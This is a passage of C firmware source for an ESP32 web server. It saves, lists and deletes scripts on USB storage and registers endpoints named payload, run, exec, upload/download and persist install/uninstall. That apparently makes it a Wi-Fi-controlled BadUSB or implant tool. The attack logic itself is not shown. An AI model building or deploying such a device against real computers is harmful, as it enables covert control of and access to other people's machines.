            json[ji++] = c;
        }
        json[ji++] = '"';
        count++;
    }
    closedir(d);

    json[ji++] = ']';
    json[ji++] = '}';
    json[ji] = '\0';

    httpd_resp_set_type(req, "application/json");
    esp_err_t ret = httpd_resp_send(req, json, (ssize_t)ji);
    free(json);
    return ret;
}

/* === STEP3-3: POST /api/scripts (salva) === */
static esp_err_t scripts_post_handler(httpd_req_t *req)
{
    if (!tud_mounted()) {
        return send_json_err(req, 400, "USB not mounted");
    }

    char query[128];
    char name_enc[64];
    char overwrite_enc[8];

    if (httpd_req_get_url_query_str(req, query, sizeof(query)) != ESP_OK ||
        httpd_query_key_value(query, "name", name_enc, sizeof(name_enc)) != ESP_OK) {
        return send_json_err(req, 400, "missing name in query");
    }

    char name[SCRIPT_NAME_MAX + 1];
    url_decode(name, name_enc, sizeof(name));

    char path[SCRIPT_PATH_MAX];
    if (!script_build_path(name, path, sizeof(path))) {
        return send_json_err(req, 400, "invalid name");
    }

    bool overwrite = false;
    if (httpd_query_key_value(query, "overwrite", overwrite_enc,
                              sizeof(overwrite_enc)) == ESP_OK) {
        overwrite = (strcmp(overwrite_enc, "1") == 0);
    }

    /* Se il file esiste e overwrite non richiesto -> rifiuta */
    if (!overwrite) {
        struct stat st;
        if (stat(path, &st) == 0) {
            httpd_resp_set_status(req, "409 Conflict");
            httpd_resp_set_type(req, "application/json");
            return httpd_resp_send(req,
                "{\"ok\":false,\"err\":\"already exists\"}", HTTPD_RESP_USE_STRLEN);
        }
    }

    scripts_dir_ensure();

    size_t total = req->content_len;
    if (total > PAYLOAD_MAX_SIZE) {
        return send_json_err(req, 400, "script too large");
    }

    char *buf = malloc(total + 1);
    if (!buf) return send_json_err(req, 500, "out of memory");

    size_t received = 0;
    while (received < total) {
        int r = httpd_req_recv(req, buf + received, total - received);
        if (r <= 0) {
            free(buf);
            return send_json_err(req, 500, "recv failed");
        }
        received += r;
    }
    buf[received] = '\0';

    FILE *f = fopen(path, "w");
    if (!f) {
        free(buf);
        return send_json_err(req, 500, "cannot open script for writing");
    }
    size_t wr = fwrite(buf, 1, received, f);
    fclose(f);
    free(buf);

    if (wr != received) {
        return send_json_err(req, 500, "short write");
    }

    ESP_LOGI(TAG, "script saved: %s (%u bytes)", name, (unsigned)received);
    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, "{\"ok\":true}", HTTPD_RESP_USE_STRLEN);
}

/* === STEP3-4: DELETE /api/scripts?name=NOME === */
static esp_err_t scripts_delete_handler(httpd_req_t *req)
{
    if (!tud_mounted()) {
        return send_json_err(req, 400, "USB not mounted");
    }

    char query[128];
    char name_enc[64];

    if (httpd_req_get_url_query_str(req, query, sizeof(query)) != ESP_OK ||
        httpd_query_key_value(query, "name", name_enc, sizeof(name_enc)) != ESP_OK) {
        return send_json_err(req, 400, "missing name in query");
    }

    char name[SCRIPT_NAME_MAX + 1];
    url_decode(name, name_enc, sizeof(name));

    char path[SCRIPT_PATH_MAX];
    if (!script_build_path(name, path, sizeof(path))) {
        return send_json_err(req, 400, "invalid name");
    }

    if (remove(path) != 0) {
        return send_json_err(req, 404, "script not found");
    }

    ESP_LOGI(TAG, "script deleted: %s", name);
    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, "{\"ok\":true}", HTTPD_RESP_USE_STRLEN);
}

static const httpd_uri_t s_uri_terminal = {
    .uri = "/terminal", .method = HTTP_GET, .handler = terminal_get_handler, .user_ctx = NULL,
};
static const httpd_uri_t s_uri_status = {
    .uri = "/api/status", .method = HTTP_GET, .handler = status_get_handler, .user_ctx = NULL,
};
static const httpd_uri_t s_uri_mount = {
    .uri = "/api/mount", .method = HTTP_POST, .handler = mount_post_handler, .user_ctx = NULL,
};
static const httpd_uri_t s_uri_payload_get = {
    .uri = "/api/payload", .method = HTTP_GET, .handler = payload_get_handler, .user_ctx = NULL,
};
static const httpd_uri_t s_uri_payload_post = {
    .uri = "/api/payload", .method = HTTP_POST, .handler = payload_post_handler, .user_ctx = NULL,
};
static const httpd_uri_t s_uri_run = {
    .uri = "/api/run", .method = HTTP_POST, .handler = run_post_handler, .user_ctx = NULL,
};
static const httpd_uri_t s_uri_exec = {
    .uri = "/api/exec", .method = HTTP_POST, .handler = exec_post_handler, .user_ctx = NULL,
};
static const httpd_uri_t s_uri_upload = {
    .uri = "/api/upload", .method = HTTP_POST, .handler = upload_post_handler, .user_ctx = NULL,
};
static const httpd_uri_t s_uri_download = {
    .uri = "/api/download", .method = HTTP_GET, .handler = download_get_handler, .user_ctx = NULL,
};
static const httpd_uri_t s_uri_ls = {
    .uri = "/api/ls", .method = HTTP_GET, .handler = ls_get_handler, .user_ctx = NULL,
};
static const httpd_uri_t s_uri_persist_install = {
    .uri = "/api/persist/install", .method = HTTP_POST,
    .handler = persist_install_post_handler, .user_ctx = NULL,
};
static const httpd_uri_t s_uri_persist_uninstall = {
    .uri = "/api/persist/uninstall", .method = HTTP_POST,
    .handler = persist_uninstall_post_handler, .user_ctx = NULL,
};
static const httpd_uri_t s_uri_persist_status = {
    .uri = "/api/persist/status", .method = HTTP_GET,
    .handler = persist_status_get_handler, .user_ctx = NULL,
};
/* === STEP3-5: URI handler per script === */
static const httpd_uri_t s_uri_scripts_get = {
    .uri = "/api/scripts", .method = HTTP_GET, .handler = scripts_get_handler, .user_ctx = NULL,
};
static const httpd_uri_t s_uri_scripts_post = {
    .uri = "/api/scripts", .method = HTTP_POST, .handler = scripts_post_handler, .user_ctx = NULL,
};
static const httpd_uri_t s_uri_scripts_delete = {
    .uri = "/api/scripts", .method = HTTP_DELETE, .handler = scripts_delete_handler, .user_ctx = NULL,
};

esp_err_t web_server_start(tinyusb_msc_storage_handle_t storage_hdl)
{
    if (s_server) return ESP_OK;

    s_storage_hdl = storage_hdl;

    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.lru_purge_enable = true;
    config.stack_size = 24576;
    config.max_uri_handlers = 19;

    esp_err_t ret = httpd_start(&s_server, &config);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "httpd_start failed: %s", esp_err_to_name(ret));
        return ret;
    }

    httpd_register_uri_handler(s_server, &s_uri_index);
    httpd_register_uri_handler(s_server, &s_uri_terminal);
    httpd_register_uri_handler(s_server, &s_uri_status);
    httpd_register_uri_handler(s_server, &s_uri_mount);
    httpd_register_uri_handler(s_server, &s_uri_payload_get);
    httpd_register_uri_handler(s_server, &s_uri_payload_post);
    httpd_register_uri_handler(s_server, &s_uri_run);
    httpd_register_uri_handler(s_server, &s_uri_exec);
    httpd_register_uri_handler(s_server, &s_uri_upload);
    httpd_register_uri_handler(s_server, &s_uri_download);
    httpd_register_uri_handler(s_server, &s_uri_ls);
    httpd_register_uri_handler(s_server, &s_uri_persist_install);
    httpd_register_uri_handler(s_server, &s_uri_persist_uninstall);
    httpd_register_uri_handler(s_server, &s_uri_persist_status);
    httpd_register_uri_handler(s_server, &s_uri_scripts_get);
    httpd_register_uri_handler(s_server, &s_uri_scripts_post);
    httpd_register_uri_handler(s_server, &s_uri_scripts_delete);
    ESP_LOGI(TAG, "HTTP server started on http://192.168.4.1/");
    return ESP_OK;
}